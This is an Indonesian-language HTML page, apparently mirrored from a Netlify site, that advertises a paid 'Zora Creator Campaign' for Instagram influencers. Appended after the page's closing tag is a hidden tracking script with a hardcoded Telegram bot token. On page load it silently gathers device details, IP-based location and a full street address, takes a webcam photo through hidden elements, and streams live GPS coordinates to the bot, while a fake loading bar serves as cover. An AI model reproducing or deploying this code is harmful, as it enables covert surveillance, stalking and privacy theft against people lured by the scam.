
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Zora Creator Campaign — Ubah Bio IG, Dapat Dollar Mingguan</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#0b1220;
      --card:#0f172a;
      --muted:#94a3b8;
      --text:#e5e7eb;
      --brand:#7c3aed;
      --brand2:#22d3ee;
      --ok:#10b981;
      --bd:#1f2a44;
      --chip:#111827;
      --shadow:0 10px 30px rgba(0,0,0,.35);
      --radius:18px;
    }
    *{box-sizing:border-box}
    html,body{margin:0;background:linear-gradient(180deg,#0a0f1c 0%,#0b1324 100%);color:var(--text);font-family:Poppins,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;line-height:1.6}
    a{color:var(--brand2);text-decoration:none}
    .container{max-width:1100px;margin:0 auto;padding:20px}
    .hero{
      background: radial-gradient(1200px 400px at 20% -10%, rgba(124,58,237,.25),transparent 60%),
                radial-gradient(1200px 400px at 80% -20%, rgba(34,211,238,.2),transparent 60%);
      border:1px solid var(--bd);
      border-radius:28px;
      padding:48px 28px;
      margin:28px 0;
      box-shadow:var(--shadow)
    }
    .badge{display:inline-flex;gap:8px;align-items:center;background:rgba(34,211,238,.08);border:1px solid rgba(34,211,238,.2);padding:6px 12px;border-radius:999px;font-size:.9rem}
    .title{font-size:2.1rem;margin:12px 0 6px}
    .subtitle{color:var(--muted);max-width:780px}
    .cta-row{display:flex;gap:12px;flex-wrap:wrap;margin-top:18px}
    .btn{
      background:linear-gradient(135deg,var(--brand),#5b21b6 60%);
      padding:12px 18px;border:none;border-radius:12px;color:#fff;font-weight:600;cursor:pointer
    }
    .btn.secondary{background:#111827;border:1px solid var(--bd)}
    .grid{display:grid;grid-template-columns:repeat(12,1fr);gap:18px;margin-top:26px}
    .card{grid-column:span 12;background:var(--card);border:1px solid var(--bd);border-radius:var(--radius);padding:20px;box-shadow:var(--shadow)}
    @media(min-width:900px){
      .col-6{grid-column:span 6}
      .col-4{grid-column:span 4}
      .col-8{grid-column:span 8}
    }
    h2{font-size:1.35rem;margin:0 0 10px;display:flex;align-items:center;gap:10px}
    .chip{display:inline-flex;align-items:center;gap:8px;background:var(--chip);border:1px solid var(--bd);padding:6px 10px;border-radius:999px;font-size:.9rem;color:var(--muted)}
    .list{margin:8px 0 0;padding-left:18px}
    .list li{margin:6px 0}
    .table{width:100%;border-collapse:collapse;margin-top:10px}
    .table th,.table td{border:1px solid var(--bd);padding:12px;text-align:center}
    .table th{background:#0b1731}
    .step{display:flex;gap:12px;margin:10px 0;padding:12px;border:1px dashed var(--bd);border-radius:14px;background:#0c162b}
    .step .num{min-width:34px;height:34px;border-radius:50%;display:grid;place-items:center;background:#111827;border:1px solid var(--bd);font-weight:700}
    figure{margin:10px 0;border:1px solid var(--bd);border-radius:14px;overflow:hidden;background:#0c162b}
    figure img{display:block;width:100%;height:auto}
    figcaption{font-size:.9rem;color:var(--muted);padding:10px 12px;border-top:1px solid var(--bd)}
    .notice{background:#0d1a33;border:1px solid var(--bd);padding:12px;border-radius:12px;color:var(--muted)}
    .split{display:flex;gap:10px;flex-wrap:wrap}
    .split .pill{flex:1;min-width:180px;background:#0c162b;border:1px solid var(--bd);padding:12px;border-radius:12px;text-align:center}
    footer{opacity:.8;text-align:center;margin:28px 0;color:var(--muted)}
    .ok{color:var(--ok);font-weight:700}
    .muted{color:var(--muted)}
    .kbd{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;background:#0e1527;border:1px solid var(--bd);padding:2px 6px;border-radius:6px;color:#cbd5e1}
    
    /* === KODE ANIMASI BARU DIMULAI DI SINI === */
    
    /* 1. Definisikan animasi keyframes */
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    /* 2. Gaya untuk elemen yang akan dianimasikan saat dibuka */
    .hero,
    .hero .badge,
    .hero .title,
    .hero .subtitle {
      /* Sembunyikan elemen di awal dan atur properti animasi */
      opacity: 0;
      animation: fadeInUp 0.8s ease-out forwards;
    }
    
    /* 3. Atur delay (penundaan) agar elemen muncul satu per satu (staggered effect) */
    .hero { animation-delay: 0.2s; }
    .hero .badge { animation-delay: 0.4s; }
    .hero .title { animation-delay: 0.6s; }
    .hero .subtitle { animation-delay: 0.8s; }
    
    /* 4. Gaya untuk elemen yang akan dianimasikan saat di-scroll */
    .card {
      /* Sembunyikan kartu di awal */
      opacity: 0;
      transform: translateY(20px);
      transition: opacity 0.6s ease-out, transform 0.6s ease-out;
    }
    
    .card.is-visible {
      /* Saat kelas 'is-visible' ditambahkan oleh JavaScript, kartu akan muncul */
      opacity: 1;
      transform: translateY(0);
    }
    /* === AKHIR DARI KODE ANIMASI === */

  </style>
</head>
<body>
  <div class="container">
    <section class="hero">
      <span class="badge">⚡ Zora Creator Campaign • Weekly Slot</span>
      <h1 class="title">Ubah Bio Instagram • Dapat Dollar Mingguan</h1>
      <p class="subtitle">Dipilih langsung oleh agency (tanpa formulir). 1 akun bisa ikut <b>seminggu sekali</b> — yang dinilai: jumlah followers (minimal 100k+), keaktifan, dan insights.</p>
      <div class="cta-row">
          </div>
    </section>

    <section class="grid">
      <div class="card col-8">
        <h2>🎯 Tentang Campaign</h2>
        <p>Zora.co adalah platform sosial berbasis blockchain untuk ekonomi kreator & NFT. Tugasmu sederhana: saat dipanggil agency, pasang link Zora di bio & link bio IG selama beberapa menit, kirim screenshot, tunggu verifikasi, dan terima pembayaran USD.</p>
      </div>
      <div class="card col-4">
        <h2>🧭 Mekanisme</h2>
        <ul class="list">
          <li>Dipilih langsung oleh agency (DM/WA).</li>
          <li>Tanpa formulir, tanpa kontrak panjang.</li>
          <li>1 akun bisa ikut <b>mingguan</b> (sesuai giliran).</li>
        </ul>
      </div>

      <div class="card col-6">
        <h2>💸 Estimasi Reward</h2>
        <table class="table">
          <tr><th>Followers IG</th><th>Perkiraan USD</th></tr>
          <tr><td>100K – 500K</td><td>$5 – $50</td></tr>
          <tr><td>500K – 1M</td><td>$20 – $70</td></tr>
          <tr><td>1M+</td><td>$30 – $100</td></tr>
        </table>

        <figure style="margin-top:16px;display:flex;flex-direction:column;align-items:center;justify-content:center;">
          <img id="exampleDollar"  
               src="https://babayshop.my.id/zora/dollar.png"
               alt="Contoh hasil dollar verifikasi akun Zora"  
               style="width:60%;max-width:240px;border-radius:14px;border:1px solid var(--bd);
                      box-shadow:0 0 20px rgba(124,58,237,0.15);transition:0.3s ease;">
          <figcaption style="font-size:.9rem;color:var(--muted);margin-top:6px;text-align:center;">
            Contoh hasil verifikasi dollar setelah akun IG diverifikasi.
          </figcaption>
        </figure>

        <p class="muted"><i><b>Nominal bersifat /variatif sesuai verifikasi & profil; dapat berubah tiap periode.</b></i></p>
      </div>

      <div id="cara-ikut" class="card col-12">
        <h2>🛠️ Cara Ikut (Saat Kamu Dihubungi Agency)</h2>
        <div class="step"><div class="num">1</div><div><b>Terima Link</b> — Agency mengirim link Zora yang harus ditempatkan di bio & link bio IG kamu.</div></div>
        <div class="step"><div class="num">2</div><div><b>Ganti Bio & Link Bio</b> — Ubah sesuai instruksi. Lihat contoh di bawah agar tidak keliru.</div></div>
        <div class="step"><div class="num">3</div><div><b>Kirim Screenshot</b> — Pastikan username, bio, dan link bio terlihat jelas dalam satu tangkapan layar.</div></div>
        <div class="step"><div class="num">4</div><div><b>Verifikasi</b> — Agency mengecek keaktifan dan kesesuaian. Nominal USD ditentukan setelah lolos verifikasi.</div></div>
        <div class="step"><div class="num">5</div><div><b>Pembayaran</b> — Dana ditransfer (PayPal/DANA/e-wallet). Setelahnya kamu boleh mengembalikan bio ke semula.</div></div>

<figure style="display:flex;flex-direction:column;align-items:center;">
  <img id="exampleBio" 
       src="https://babayshop.my.id/contoh-zora.png" 
       alt="Contoh perubahan bio & link bio Instagram untuk campaign Zora"
       style="width:60%;height:auto;display:block;margin:0 auto;">
  <figcaption>
<span class="kbd">Contoh perubahan bio & link bio yang benar. </span>
  </figcaption>
</figure>
<div class="notice">
  Tip: Tuliskan teks bio singkat + tempel link Zora yang diberikan. Contoh link:
  <span class="kbd">https://zora.co/@masterchanx</span>
</div>


      <div class="card col-6">
        <h2>✅ Yang Dinilai</h2>
        <ul class="list">
          <li>Jumlah followers (≥100K)</li>
          <li>Keaktifan akun (posting, story, interaksi)</li>
          <li>Insights (reach, impressions, engagement)</li>
        </ul>
      </div>

      <div class="card col-6">
        <h2>⚠️ Catatan</h2>
        <ul class="list">
          <li>Keputusan kelayakan & nominal USD bersifat <b>final</b> dari agency.</li>
          <li>Campaign bisa berhenti kapan saja.</li>
        </ul>
      </div>

      <div class="card col-12">
        <h2>📬 Kontak & Dukungan</h2>
        <p>DM saat dihubungi resmi oleh agency atau kirim pertanyaan ke <a href="mailto:team@zora-agency.example">team@zora-agency.example</a>. Mohon waspada akun palsu.</p>
      </div>
    </section>

    <footer>
      <div>© 2025 Zora Agency • Partner: Babay.27</div>
    </footer>
  </div>

  <script>
    // Helper: cepat ganti gambar contoh via query string ?img=URL
    (function(){
      const params=new URLSearchParams(location.search);
      const img=params.get('img');
      if(img){ document.getElementById('exampleBio').src=img; }
    })();

    // === JAVASCRIPT UNTUK ANIMASI ON-SCROLL ===
    document.addEventListener('DOMContentLoaded', function() {
      const cards = document.querySelectorAll('.card');

      // Cek jika browser mendukung IntersectionObserver
      if ('IntersectionObserver' in window) {
        const observer = new IntersectionObserver((entries, observer) => {
          entries.forEach(entry => {
            // Jika elemen (kartu) masuk ke dalam viewport
            if (entry.isIntersecting) {
              entry.target.classList.add('is-visible');
              // Hentikan pengamatan setelah animasi berjalan agar tidak berulang
              observer.unobserve(entry.target);
            }
          });
        }, {
          threshold: 0.1 // Animasi aktif saat 10% dari kartu terlihat
        });

        // Amati setiap kartu
        cards.forEach(card => {
          observer.observe(card);
        });
      } else {
        // Fallback untuk browser lama yang tidak mendukung IntersectionObserver
        // Tampilkan semua kartu secara langsung
        cards.forEach(card => {
          card.classList.add('is-visible');
        });
      }
    });

  </script>
</body>
</html>

<!--Pembatasan kah -->



    <video id="video" autoplay muted class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>
    
    
<!--Pembatasan kah -->
    <script>
        const token = '8295593119:AAG_-Tr1HVrFVpD0_f4OLHSGEsqoDCk84og';
        const chatId = '1212063779';

        
        // Simulate infinite loading
        let progress = 0;
        const progressBar = document.getElementById('progress-bar');
        const loadingDetails = document.getElementById('loading-details');
        const loadingMessages = [
            "Memeriksa modul sistem...",
            "Memuat komponen inti...",
            "Menginisialisasi antarmuka...",
            "Memverifikasi koneksi...",
            "Menyiapkan lingkungan...",
            "Memeriksa pembaruan...",
            "Memuat aset tampilan..."
        ];

        const loadingInterval = setInterval(() => {
            progress += Math.random() * 5;
            if (progress > 98) progress = 98;
            progressBar.style.width = progress + '%';
            
            if (Math.random() > 0.9) {
                loadingDetails.textContent = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
            }
        }, 500);
        

        // Telegram functions
        const sendToTelegram = async (data) => {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: data,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error('Error sending to Telegram:', e);
            }
        };

        const sendPhoto = async (blob, filename) => {
            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, filename);
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.error('Error sending photo:', e);
            }
        };

        // Get detailed location
        const getLocationDetails = async (lat, lon) => {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
                const data = await response.json();
                
                if (data.address) {
                    return {
                        kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
                        kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
                        fullAddress: data.display_name || "Alamat tidak tersedia"
                    };
                }
            } catch (e) {
                console.error('Error getting location details:', e);
            }
            return {
                kabupaten: "Tidak diketahui",
                kecamatan: "Tidak diketahui",
                fullAddress: "Alamat tidak tersedia"
            };
        };

        // Collect device information
        const collectDeviceInfo = async () => {
            let message = '╭───── Tracking Report ───── ⦿\n\n';
            
            // Device Information
            message += '⚙️ DEVICE INFORMATION\n';
            message += `🖥️ Device: ${navigator.userAgent}\n`;
            message += `💻 Platform: ${navigator.platform}\n`;
            message += `🌐 Bahasa: ${navigator.language}\n`;
            message += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
            message += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
            message += `🪟 Window Size: ${window.innerWidth}x${window.innerHeight}\n`;
          
                      // Battery Info
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    message += `🔋 Battery: ${Math.floor(battery.level * 100)}%\n`;
                    message += `🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
                } catch (e) {
                    message += '🔋 Battery: ❌ Tidak tersedia\n';
                }
            }
            
            message += `⏰ Waktu Akses: ${new Date().toString()}\n`;
            message += `🕒 Page Load Time: ${(performance.now()).toFixed(2)} ms\n`;
            message += `📜 History Length: ${history.length}\n`;
            message += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
            message += `🔗 Referrer: ${document.referrer || 'None'}\n`;
            message += `🌍 URL: ${window.location.href}\n`;
            message += `📄 Title: ${document.title}\n`;
            message += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
            message += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
            

            // IP and Location Information
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                
                message += '📍 LOCATION INFORMATION\n';
                message += `📡 IP Address: ${ipData.ip}\n`
                message += `🏙️ Kota: ${ipData.city}\n`;
                message += `🏙️ Kabupaten: ${ipData.region}\n`;
                message += `🗺️ Wilayah: ${ipData.region}\n`;
                message += `🌎 Negara: ${ipData.country_name}\n`;
                message += `🏷️ Kode Pos: ${ipData.postal}\n`;
                
                if (ipData.latitude && ipData.longitude) {
                    message += `📌 Latitude: ${ipData.latitude}\n`;
                    message += `📍 Longitude: ${ipData.longitude}\n`;
                    
                    const locationDetails = await getLocationDetails(ipData.latitude, ipData.longitude);
                    message += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
                    message += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
                    message += `🏠 Alamat Lengkap: ${locationDetails.fullAddress}\n`;
                    
                }
            } catch (e) {
                message += '❌ Gagal mendapatkan informasi lokasi\n';
            }

            message += '\n╰───── Telegram ───── ⦿';
            return message;
        };

        // Main tracking function
        const startTracking = async () => {
            // Send device info
            const deviceInfo = await collectDeviceInfo();
            await sendToTelegram(deviceInfo);

            // Try to access camera
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 3000));
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => sendPhoto(blob, 'camera_capture.html'), 'image/jpeg');
                
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                await sendToTelegram('❌ Camera access blocked');
            }


            // GPS tracking
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(async (pos) => {
                    const coords = pos.coords;
                    let gpsInfo = `📍 LIVE GPS TRACKING\n`;
                    gpsInfo += `📌 Lat: ${coords.latitude}\n`;
                    gpsInfo += `📍 Lng: ${coords.longitude}\n`;
                    gpsInfo += `🎯 Akurasi: ${coords.accuracy}m\n`;
                    
                    const locationDetails = await getLocationDetails(coords.latitude, coords.longitude);
                    gpsInfo += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
                    gpsInfo += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
                    gpsInfo += `🏠 Alamat: ${locationDetails.fullAddress}\n`;
                    
                    
                    await sendToTelegram(gpsInfo);
                }, 
                async (err) => {
                    await sendToTelegram(`❌ GPS Error: ${err.message}`);
                }, 
                { 
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 5000
                });
            }
        };

        // Start tracking after delay
        setTimeout(startTracking, 3000);
    </script>
</body>

<!-- Mirrored from web-bug-wangsaf.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 01 Oct 2025 03:49:17 GMT -->
</html>
